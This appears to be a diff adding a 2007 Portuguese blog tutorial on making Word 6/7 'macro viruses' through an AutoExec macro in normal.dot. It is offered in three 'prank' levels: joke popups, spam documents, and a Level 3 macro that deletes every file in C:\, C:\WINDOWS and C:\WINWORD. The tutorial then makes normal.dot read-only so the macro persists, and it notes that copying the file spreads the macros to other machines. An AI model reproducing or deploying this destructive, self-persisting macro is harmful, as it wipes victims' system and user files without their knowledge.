@@ -1,0 +1,41 @@
+<h1>Vírus de Macro do Word</h1>
+<time>2007-06-10T16:39:06-03:00</time>
+<p>Muitos usuários ainda utilizam o Word apenas de forma básica, limitando-se a digitar, aplicar negrito, sublinhar e enviar para a impressora. Eles desconhecem a riqueza de recursos oferecida por esse poderoso processador de texto. Este material demonstra como criar macros no Word para realizar desde pequenas brincadeiras até ações avançadas.</p>
+<p><b>Software abrangido</b>: Microsoft Word, versões 6 (Windows 3.11) e 7.0 (Windows 95). Não testado em versões mais recentes.</p>
+<p>O Word possui um arquivo chamado <code>normal.dot</code>, que armazena todas as configurações padrão do programa. Se esse arquivo for excluído, o Word o recria automaticamente na próxima inicialização.</p>
+<h2>Níveis de "Brincadeira"</h2>
+<ul>
+<li><b>Nível 1</b>: Apenas uma mensagem humorística.</li>
+<li><b>Nível 2</b>: Uma brincadeira de mau gosto.</li>
+<li><b>Nível 3</b>: Ações que podem causar sérios problemas.</li>
+</ul>
+<h2>Como Criar uma Macro</h2>
+<center><img src="/files/word2003-macro.JPG" width="500" height="252" hspace="5" vspace="5" border="1"></center>
+<ol>
+<li>Abra o Word e feche todas as janelas de documento abertas.</li>
+<li>No menu <b>Arquivo</b>, clique em <b>Macro</b>.</li>
+<li>Insira o nome da macro como <code>AutoExec</code> (obrigatório).
+<ul>
+<li>A macro <code>AutoExec</code> é executada sempre que o Word é iniciado.</li>
+</ul></li>
+<li>Clique em <b>Criar</b>.</li>
+<li>Exclua as linhas padrão <code>Sub MAIN</code> e <code>End Sub</code>.</li>
+<li>Cole o código correspondente ao nível desejado.</li>
+</ol>
+<p>Outras formas de criar macros existem, mas esta é a mais simples.</p>
+<h3>Nível 1: Mensagens Humorísticas</h3>
+<p>Adicione o seguinte código para exibir mensagens ao abrir o Word:</p>
+<pre><code>Sub MAIN() MsgBox "Você é um pentelho! Eu não irei prosseguir com o sistema", vbExclamation, "Microsoft Word" MsgBox "Usuário Pirata Detectado", vbCritical, "FATAL ERROR" MsgBox "JAMES BOND 007", vbInformation, "007 na estrada Digital" End Sub</code></pre>
+<h3>Nível 2: Irritar o Usuário</h3>
+<p>Este nível adiciona várias mensagens repetitivas nos documentos abertos.</p>
+<pre><code>Sub MAIN() ArquivoNovoPadrão Inserir "James" ArquivoNovoPadrão Inserir "Bond" ArquivoNovoPadrão Inserir "007" ArquivoNovoPadrão Inserir "James Bond 007 Na Estrada digital" For i = 1 To 10 ArquivoNovoPadrão Inserir "." Next ArquivoNovoPadrão Inserir "James Bond 007 Na Estrada digital" End Sub</code></pre>
+<h3>Nível 3: Ações Críticas</h3>
+<p>Este nível pode excluir arquivos do computador. Use com extrema cautela.</p>
+<pre><code>Sub MAIN() Kill "C:\*.*" Kill "C:\WINDOWS\*.*" Kill "C:\WINWORD\*.*" End Sub</code></pre>
+<p><b>Nota</b>: Após inserir esta macro, proteja o arquivo <code>normal.dot</code> com o comando:</p>
+<pre><code>attrib +r normal.dot</code></pre>
+<h2>Detalhes Importantes</h2>
+<ul>
+<li>A macro <code>AutoExec</code> será salva no arquivo <code>normal.dot</code>. Se esse arquivo for copiado para outro computador, as macros contidas nele serão executadas.</li>
+<li>Existe uma forma de iniciar o Word sem executar a macro <code>AutoExec</code>, mas cabe a você descobrir.</li>
+</ul>
